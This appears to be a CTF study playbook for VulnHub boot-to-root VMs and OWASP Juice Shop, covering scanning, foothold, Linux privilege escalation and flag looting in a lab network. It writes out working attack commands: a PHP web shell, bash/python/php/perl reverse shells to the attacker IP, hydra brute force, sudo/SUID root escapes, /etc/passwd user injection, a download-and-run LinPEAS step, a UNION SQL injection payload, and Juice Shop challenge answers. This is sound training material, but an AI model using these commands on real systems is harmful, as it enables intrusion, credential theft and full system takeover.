# 51 — Day 3 CTF: VulnHub Boot-to-Root Playbook + Juice Shop Medium

> **Day plan reminder:** confirmed 3-day competition. Day 1 = MA1 (CMS pentest), Day 2 = MA2 (Security Hardening), **Day 3 = CTF (this file + `50_…` warm-up + `52_…` advanced)**. The boot-to-root methodology in this file applies to whichever VulnHub VM the chief randomly picks.

**Time:** ~3 hours after the Juice Shop warm-up in `50_…`.
**Pre-req:** `05_Setup_JuiceShop.md` and `06_Setup_VulnHub.md` complete; Kali VM running.

This file covers the **universal boot-to-root playbook** that works for any VulnHub VM, plus a quick reference for Juice Shop ★3–★4 challenges.

> Boot-to-root flow:
> **Discover → Enumerate → Foothold → Privilege Escalation → Loot.**
> Memorise the order. Every CTF VM follows it.

---

## Phase 1 — Discover the target

```bash
# Identify your own IP and the subnet
ip a | grep 192.168
# e.g. 192.168.56.128/24 → subnet 192.168.56.0/24

# Find hosts on the subnet (skip your own IP)
sudo netdiscover -i eth0 -r 192.168.56.0/24
# OR
sudo arp-scan -l --interface=eth0
# OR (slower)
sudo nmap -sn 192.168.56.0/24
```

> Note the target IP. You'll set it as a variable to save typing:
> ```bash
> export TGT=192.168.56.150
> ```

---

## Phase 2 — Enumerate the target

### 2.1 Port + version scan (always run two scans)

```bash
# Quick: top 1000 TCP ports for fast triage
sudo nmap -sS -T4 --top-ports 1000 -oN nmap_quick.txt $TGT

# Full: every TCP port + service version + default scripts
sudo nmap -sC -sV -p- -T4 -oN nmap_full.txt $TGT &

# UDP top 50 (often reveals SNMP/TFTP/DNS)
sudo nmap -sU --top-ports 50 -oN nmap_udp.txt $TGT
```

The `-sC` runs nmap's safe default scripts (banner grab, SMB OS detection, FTP anon check, HTTP title, etc.). `-sV` does service version fingerprinting.

### 2.2 Per-service enumeration (apply only to ports the scan found)

| Port | Service | Commands to run |
|---|---|---|
| 21 | FTP | `ftp $TGT` then try `anonymous` / `anonymous` — if allowed, `ls -la` everywhere |
| 22 | SSH | `nmap --script ssh-auth-methods,ssh2-enum-algos -p 22 $TGT`. Note version — old OpenSSH have known username-enum CVEs (e.g., 7.7) |
| 25 | SMTP | `nmap --script smtp-enum-users,smtp-commands -p 25 $TGT` (sometimes leaks valid users) |
| 53 | DNS | `dig axfr @$TGT example.com` (zone transfer); `dnsenum $TGT` |
| 80/443/8000/8080 | HTTP(S) | See web section 2.3 below |
| 110/143/993/995 | Mail | `nmap --script pop3-capabilities,imap-capabilities -p 110,143 $TGT` |
| 111 | Portmap (NFS) | `showmount -e $TGT` to list exports; `mount -t nfs $TGT:/share /mnt/nfs` |
| 139/445 | SMB | `smbclient -L //$TGT/ -N`, `enum4linux -a $TGT`, `smbmap -H $TGT`, `nmap --script smb-vuln-* -p 139,445 $TGT` |
| 161 | SNMP | `snmpwalk -v2c -c public $TGT` (if `public` works, you'll see system info, processes, users) |
| 389/636 | LDAP | `nmap --script ldap-rootdse,ldap-search -p 389 $TGT` |
| 873 | rsync | `rsync $TGT::` — lists modules; `rsync -av $TGT::module/` to browse |
| 3306 | MySQL | `mysql -h $TGT -u root` (try empty pass), `nmap --script mysql-empty-password -p 3306 $TGT` |
| 5432 | Postgres | `psql -h $TGT -U postgres` (try empty pass) |
| 5985/5986 | WinRM (rare on VulnHub) | `evil-winrm -i $TGT -u user -p pass` |
| 6379 | Redis | `redis-cli -h $TGT` — if no auth, `INFO`, `CONFIG GET dir` |
| 8080/8443 | Tomcat / WebUI | look for `/manager/html` (default tomcat:tomcat or admin:admin) |

### 2.3 Web (the most common foothold path)

For every HTTP/HTTPS port:

```bash
# Visit the page first (eyeballing > automation)
firefox http://$TGT &

# Tech fingerprint
whatweb http://$TGT
nikto -h http://$TGT -o nikto.txt

# Hidden directories + files (start with `common`, escalate to bigger lists)
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -o gob.txt
# When ready, scale up:
gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt -o gob_med.txt

# vhost / subdomain fuzz (when host header is meaningful)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://$TGT -H "Host: FUZZ.target.tld" -fs <baseline-size>

# Always look at these endpoints by hand
curl -s http://$TGT/robots.txt
curl -s http://$TGT/.git/HEAD
curl -s http://$TGT/sitemap.xml
curl -s http://$TGT/.env
```

### 2.4 If the web app is a known CMS

| Tech (from whatweb) | Tool |
|---|---|
| **WordPress** | `wpscan --url http://$TGT --enumerate u,p,t` then `wpscan --url http://$TGT --usernames userlist.txt --passwords rockyou.txt` |
| **Joomla** | `joomscan --url http://$TGT` |
| **Drupal** | `droopescan scan drupal -u http://$TGT` (look at version → search for known CVE numerics like Drupalgeddon) |
| **PHPMyAdmin** | try `root:root`, `root:` (empty), `admin:admin`. Look at `/setup/` |
| **Tomcat manager** | try `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` |

---

## Phase 3 — Foothold (initial access)

Aim: get a shell on the target — even unprivileged.

### 3.1 Common foothold techniques

1. **Credential reuse / weak default passwords.** Try `admin:admin`, `root:root`, the company name, the VM name, the WordPress site title.
2. **Brute force** (slow — use as last resort, and respect rate-limits to avoid lockouts):
   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt $TGT http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
   hydra -L users.txt -P pwds.txt $TGT ssh
   ```
3. **Web exploit → upload a webshell.** Many CMS admin panels allow file upload. Upload a PHP web shell:
   ```php
   <?php system($_GET['c']); ?>
   ```
   Then visit `http://$TGT/uploads/shell.php?c=id`.
4. **SQLi to dump credentials** → log in.
5. **Anonymous FTP/SMB** → grab files, look for SSH keys / config files / passwords.
6. **Known CVE for the CMS/service version** (e.g., Drupal 7 → Drupalgeddon 2 = CVE-2018-7600; ProFTPD 1.3.3c → backdoor). Look these up locally — searchsploit:
   ```bash
   searchsploit drupal 7
   searchsploit proftpd 1.3.3
   searchsploit -m <id>     # copies the exploit to your cwd
   ```

### 3.2 Reverse shell (the most common technique)

Once you have a way to run a single command (web RCE, CMS file upload, exploit), upgrade to a full shell. From your Kali:

```bash
# Listener on Kali
nc -lvnp 4444
```

Then trigger from the target (one of these):
```bash
# bash
bash -i >& /dev/tcp/192.168.56.128/4444 0>&1

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# php (good for web shells)
php -r '$s=fsockopen("192.168.56.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# perl
perl -e 'use Socket;$i="192.168.56.128";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Replace `192.168.56.128` with **your Kali IP** every time.

> Use `https://www.revshells.com/` (offline-installable web tool) or PayloadAllTheThings (clone the repo) for any other shell variant.

### 3.3 Stabilise the reverse shell (always do this)

```bash
# In the reverse shell (target side)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background

# In your Kali terminal
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
export SHELL=bash
stty rows 50 columns 200
```

Now Tab-completion, Ctrl+C, vim, etc. all work.

---

## Phase 4 — Linux Privilege Escalation

This is the **single most important section** of the playbook. After you've got a low-priv shell, you need to become **root**. Run these checks in order.

### 4.1 Quick wins (do in 5 minutes)

```bash
# What user am I?
id; whoami; hostname

# What can I run as root without password?
sudo -l
```
If `sudo -l` shows ANY entry with `(ALL : ALL) NOPASSWD: <binary>` → check **GTFOBins** for that binary. Common winners:

| Binary | Trick |
|---|---|
| `vim` | `sudo vim -c ':!/bin/sh'` |
| `find` | `sudo find . -exec /bin/sh \; -quit` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `nmap` (interactive) | `sudo nmap --interactive` then `!sh` |
| `python` / `python3` | `sudo python -c 'import os;os.system("/bin/sh")'` |
| `perl` | `sudo perl -e 'exec "/bin/sh";'` |
| `less` / `more` / `man` | inside the pager: `!/bin/sh` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `git` | `sudo git -p help config` then `!/bin/sh` |
| `cp` / `mv` | overwrite `/etc/passwd` or `/etc/sudoers` |
| `systemctl` | edit a unit, then run; or `!sh` from less pager when listing |

→ Always `cat /etc/sudoers /etc/sudoers.d/* 2>/dev/null` for full sudoers picture.

### 4.2 SUID binaries (15 sec to enumerate)

```bash
find / -perm -4000 -type f 2>/dev/null
```

Compare the list against GTFOBins (offline mirror). Anything **not standard** (e.g., `/usr/bin/python`, `/usr/bin/find`, custom binaries in `/opt/`) is suspicious. SUID = "runs as file owner (often root) regardless of caller."

Standard SUID binaries that are usually safe: `mount`, `umount`, `passwd`, `chsh`, `chfn`, `su`, `sudo`, `gpasswd`, `newgrp`, `pkexec`, `chage` (varies by distro).

Anything ending in `.sh`, `.py`, `.pl` with SUID is almost always a CTF winner — read it, see what it does, find a way to inject.

### 4.3 Capabilities (often forgotten)

```bash
getcap -r / 2>/dev/null
```

If you see `cap_setuid+ep` on `python3.x` (e.g.):
```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Instant root.

### 4.4 Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l                        # mine
sudo crontab -l                   # root's (rarely visible)
cat /var/spool/cron/crontabs/* 2>/dev/null
```

If a cron runs a script that you can edit (writable directory in PATH, or world-writable script): inject your reverse-shell into it.

### 4.5 PATH hijack

If a SUID binary calls a sub-program **without** absolute path (e.g. `system("date")` instead of `/bin/date`), you can hijack:
```bash
mkdir /tmp/x
echo '#!/bin/bash' > /tmp/x/date
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /tmp/x/date
chmod +x /tmp/x/date
export PATH=/tmp/x:$PATH
./vulnerable_suid_binary
/tmp/rb -p
```

### 4.6 World-writable files / directories

```bash
find / -writable -type d 2>/dev/null | grep -vE "^/proc|^/sys"
find / -perm -o+w -type f 2>/dev/null | grep -vE "^/proc|^/sys"
```

Look for write access to:
- `/etc/passwd` → add a UID-0 user with a known crypt hash:
  ```bash
  openssl passwd -1 -salt abc 'P@ssw0rd'
  echo 'r00t:$1$abc$<hash>:0:0::/root:/bin/bash' >> /etc/passwd
  su - r00t
  ```
- `/etc/sudoers` → add `yourname ALL=(ALL) NOPASSWD:ALL`.
- `/etc/shadow` → replace root's hash with one you know.
- Any script in cron path or in `/usr/local/bin/`.

### 4.7 SSH keys lying around

```bash
find / -name "id_rsa" -o -name "authorized_keys" -o -name "*.pem" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
```
Found a private key? `chmod 600 stolen.id_rsa; ssh -i stolen.id_rsa user@$TGT`.

### 4.8 Kernel exploits (last resort)

```bash
uname -a
cat /etc/os-release
```

Take the kernel + distro and check `searchsploit` on Kali:
```bash
searchsploit linux kernel 4.4
searchsploit ubuntu 16.04 priv esc
```
Famous ones (memorise the names — try them only if other paths fail; they crash boxes):
- DirtyCOW (CVE-2016-5195) — kernel < 4.8.3
- DirtyPipe (CVE-2022-0847) — kernel 5.8 → 5.16.10
- Sudo Baron Samedit (CVE-2021-3156) — sudo before 1.9.5p2
- pwnkit (CVE-2021-4034) — polkit/pkexec, almost everywhere on old systems
- OverlayFS (multiple CVEs) — Ubuntu

### 4.9 Run LinPEAS (recommended automation)

If hand-checks didn't yield a path, transfer LinPEAS:

```bash
# On Kali, host LinPEAS via simple http server
cd /opt/peass
python3 -m http.server 8000

# On target
wget http://192.168.56.128:8000/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh -a > /tmp/lp.out
less /tmp/lp.out
```

LinPEAS colours findings: 🔴 = high probability privesc. Investigate every red line.

---

## Phase 5 — Loot

Once you're root:

```bash
# Find the flag(s)
find / -name "flag*" -o -name "*.flag" -o -name "proof*" 2>/dev/null
find /root -type f 2>/dev/null
ls -la /root/
cat /root/flag.txt 2>/dev/null

# Read the home of every user
for d in /home/*; do echo "=== $d ==="; ls -la $d; cat $d/*flag* 2>/dev/null; cat $d/.bash_history 2>/dev/null; done

# Sometimes flags are in services
mysql -u root -p<pwd> -e "show databases; use ctf; select * from flags;"
```

> VulnHub VMs typically have 1–6 flags. Some are at `/root/flag.txt`, some inside web app DB, some hidden in image metadata. **Don't stop after the first flag** — read the VM author's README/intro on the download page (or the in-game hints) for total count.

---

## Quick-reference: enumeration script (paste into Kali)

```bash
#!/bin/bash
TGT=$1
echo "[*] Target: $TGT"
echo "[*] Quick scan…"
sudo nmap -sS -T4 --top-ports 1000 -oN ${TGT}_quick.txt $TGT
echo "[*] Full scan in background…"
sudo nmap -sC -sV -p- -T4 -oN ${TGT}_full.txt $TGT &
PID=$!
echo "[*] Web fingerprint (if 80/443 in quick scan)…"
grep -E "^80/|^443/|^8080/" ${TGT}_quick.txt && {
  whatweb http://$TGT
  nikto -h http://$TGT -nointeractive -o ${TGT}_nikto.txt
  gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o ${TGT}_gob.txt -q
}
echo "[*] SMB enum (if 139/445 in quick scan)…"
grep -E "^445/|^139/" ${TGT}_quick.txt && enum4linux -a $TGT
wait $PID
echo "[*] Full scan complete. See ${TGT}_full.txt"
```

Save as `~/scripts/enum.sh`, `chmod +x`, run `./enum.sh $TGT`.

---

## Section X — Juice Shop ★3–★4 reference

If your CTF day uses Juice Shop instead of (or alongside) VulnHub VMs, see the dedicated walkthrough section below for ★3–★4 challenges. (This was the original content of this file before VulnHub was confirmed.)

### Login Admin (★2 — already done in `40_…`)
SQLi `' OR 1=1 --`.

### Reset Jim's Password (★4)
Forgot Password → `jim@juice-sh.op` → security question is *"Your eldest siblings middle name?"* → answer **`Samuel`** (Star Trek reference).

### CAPTCHA Bypass (★3)
Submit feedback once, capture POST `/api/Feedbacks`, replay 10 times in Burp Repeater within 10 seconds (captcha+id reused).

### User Credentials via UNION SQLi (★4)
On `/rest/products/search?q=`:
```
qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
```

### Forged Coupon (★4)
Coupon format = base64-encoded `name-mmddyy` then Z85-encoded then XOR. Use the algorithm in `juice-shop` source (`/lib/insecurity.ts`) to forge a 99% discount coupon.

### Vulnerable Library (★3)
Inspect `package.json` of your local Juice Shop install → find a deprecated dep → submit via Contact Us form: `<library-name> <version> (CVE-XXXX-YYYY)`.

> Full ★3–★4 list is back in the original draft of this file (history) — keep them in mind for any web-only days. **For boot-to-root VMs, the Phases 1–5 above are what you'll use.**

---

## Time pacing for a single VulnHub VM

| Phase | Target time |
|---|---|
| Phase 1: Discover | 2 min |
| Phase 2: Enumerate | 15–30 min |
| Phase 3: Foothold | 30–90 min |
| Phase 4: Privesc | 30–90 min |
| Phase 5: Loot + writeup | 15 min |
| **Total per VM** | **~1.5–4 h** |

If you exceed 4 h — read the VM author's hint on VulnHub (during practice only).

Next file: **`52_Day3_CTF_Advanced.md`** — concrete walkthroughs for the most popular VMs + Juice Shop hard.
